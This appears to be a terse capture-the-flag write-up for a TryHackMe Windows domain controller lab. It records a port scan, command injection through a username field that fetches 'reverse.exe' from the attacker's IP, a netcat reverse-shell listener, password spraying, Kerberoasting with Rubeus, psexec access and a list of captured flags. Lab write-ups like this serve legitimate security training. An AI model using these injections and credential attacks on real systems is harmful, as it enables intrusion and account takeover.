# Hacker of the hill

## Target IP : 10.10.135.73

## My IP : 10.8.253.221


## Rustscan
```bash
Open 10.10.135.73:81
Open 10.10.135.73:80
Open 10.10.135.73:82
Open 10.10.135.73:88
Open 10.10.135.73:135
Open 10.10.135.73:139
Open 10.10.135.73:389
Open 10.10.135.73:445
Open 10.10.135.73:464
Open 10.10.135.73:593
Open 10.10.135.73:636
Open 10.10.135.73:3268
Open 10.10.135.73:3269
Open 10.10.135.73:3389
Open 10.10.135.73:7680
Open 10.10.135.73:9389
Open 10.10.135.73:9999
Open 10.10.135.73:49665
Open 10.10.135.73:49668
Open 10.10.135.73:49669
Open 10.10.135.73:49670
Open 10.10.135.73:49681
Open 10.10.135.73:49700
```


## PORT 80 [http - Microsoft-IIS/10.0]
```bash
PhotoStore - Home

test creds : test:helloworld

when we upload jpg file it get stored in http://10.10.135.73/users/test/edf6c09f9462068bebdeabd36b5fa349.jpg

there is a change username functionality
which in background will word as 

exex(mv present/ new/)
we just have to do it as 
mv present new; reverseshell

sudo tcpdump -i tun0 icmp

ping 10.8.253.221

username=alpha | ping 10.8.253.221

alpha | powershell curl http://10.8.253.221/reverse.exe -o rev.exe
```


## PORT 81 [http]
```bash
http://10.10.135.73:81/
network monitor - pings a given ip

```


## USER [troy]
```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...

PS C:\Users\agamemnon\Desktop> whoami
whoami
troy\agamemnon
PS C:\Users\agamemnon\Desktop> cat flag.txt
cat flag.txt
THM{78ab0f3ab9decf59899148c6ba7e07dc}


PS C:\Users\agamemnon> net users
net users

User accounts for \\TROY-DC

-------------------------------------------------------------------------------
achilles                 Administrator            agamemnon                
Guest                    hector                   helen                    
krbtgt                   patrocles                
The command completed successfully.

users.txt
achilles
hector
helen
patrocles


crackmapexec -t 50 smb 10.10.135.73  -u user.txt -p /usr/share/wordlists/rockyou.txt 


PS C:\Users\agamemnon\Desktop\WebApp\public> ./rubeus.exe kerberoast
./rubeus.exe kerberoast
./rubeus.exe kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : troy.thm
[*] Searching path 'LDAP://TROY-DC.troy.thm/DC=troy,DC=thm' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : achilles
[*] DistinguishedName      : CN=Achilles,OU=Created Users,DC=troy,DC=thm
[*] ServicePrincipalName   : TIME/TROY-DC.TROY.THM
[*] PwdLastSet             : 19/02/2021 18:32:09
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*achilles$troy.thm$TIME/TROY-DC....

winniethepooh    (?)  



```


## USER [achilles]
```bash
psexec.py achilles@10.10.135.73  
winniethepooh

achilles is Administrator
```

## Flags
```bash

C:\Users\agamemnon\Desktop\flag.txt
THM{78ab0f3ab9decf59899148c6ba7e07dc}
BACK2THM{74a73793ce5fe590815c37d72b919d6b}

C:\Users\achilles\Desktop\flag.txt
THM{a95c530a7af5f492a74499e70578d150}
BACK2THM{7821a1388e6924629f3a5089caa80d75}

C:\Users\hector\desktop\flag.txt
THM{a3256be7dfd50977a4aae6583babb884}
BACK2THM{90f5209e64d1efd0899cafbb5f1ff96c}

C:\Users\helen\Desktop\flag.txt
THM{fe71b156334f5ec0fbd6e9c3cee516ac}
BACK2THM{8aca8fc6b754fac32976d63fd8234933}

C:\Users\patrocles\desktop\flag.txt
THM{ee4a601a75bc632e2c8cd2a32946c873}
BACK2THM{1b6a55660d4f8981e8b7dd2fb1b48fd8}

C:\Users\Administrator\desktop\flag.txt
THM{883f9bae55aaf77b01a3e133159e849e}
BACK2THM{b68b666215db22ce0763928e796f98c0}
```